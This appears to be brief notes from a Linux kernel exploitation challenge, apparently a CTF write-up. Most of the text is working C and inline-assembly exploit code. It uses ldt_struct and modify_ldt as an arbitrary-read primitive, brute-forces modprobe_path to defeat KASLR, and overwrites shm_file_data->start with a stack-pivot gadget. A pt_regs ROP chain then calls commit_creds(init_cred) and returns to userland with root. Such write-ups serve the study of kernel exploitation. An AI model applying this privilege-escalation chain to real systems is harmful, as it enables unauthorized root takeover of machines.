 Use `ldt_struct` for arbitrary read:

```c
struct ldt_struct {
	struct desc_struct	*entries;
	unsigned int		nr_entries;
	int			slot;
};
```

Bruteforce modprobe_path to defeat KASLR :
```c
    uint64_t modprobe_path = 0xfffffffff006c140;

    char buf[15] = {0};

    for(modprobe_path ; modprobe_path >= 0xffffffff8266c140 ; modprobe_path -= 0x100000){

        if(writeNote(modprobe_path)){
            errExit("writeNote(modprobe_path)");
        }

        memset(buf,0,sizeof(buf));

        if(syscall(SYS_modify_ldt,0,buf,sizeof(buf)) < 0){
            errExit("syscall(SYS_modify_ldt,0,buf,sizeof(buf))");
        }

        if(strcmp(buf,"/sbin/modprobe") == 0)
            break;
        if((0xfffffffff006c140 - modprobe_path) % 0x1000000 == 0)
            logInfo("Scan 0x%lx", modprobe_path);
    }
    logOK("modprobe_path = 0x%lx", modprobe_path);
    _text = modprobe_path - 23511360;
```

Overwrite `shm_file_data->start` to gadget: `add rsp, 0x0000000000000180 ; mov eax, r12d ; pop rbx ; pop r12 ; pop rbp ; ret ;` -> ROP with pt_reg struct in usermod.

```c
void trigger(int stat_fd){
    __asm__(
        ".intel_syntax noprefix;"
        "mov r15, %0 ;" // pop rdi ; ret
        "mov r14, init_cred ;" // NULL
        "mov r13, commit_creds ;"
        "mov r12, %1 ;" // pop rcx ; ret
        "lea rbp, [get_shell + 8] ;" // user_ip
        "mov rbx, %2 ;"  // pop r11 ; ret -> r11 is user_rflags
        "mov r10, %3 ;"  // syscall_return_via_sysret+24
        "mov rdx, 0x4343;"
        "mov rsi, 0x4242;"
        "xor eax, eax; "
        "syscall;"
        ".att_syntax;"
        :
        : "r" (_text + 0x75c4c), "r"(_text + 0x761da), "r"(_text + 0x7605a) , "r"(_text + 0xc00109)
    );
}
```

Set `rcx = user_ip`, `r11 = user_rflags` for `syscall_return_via_sysret+24` -> safely back to usermod.
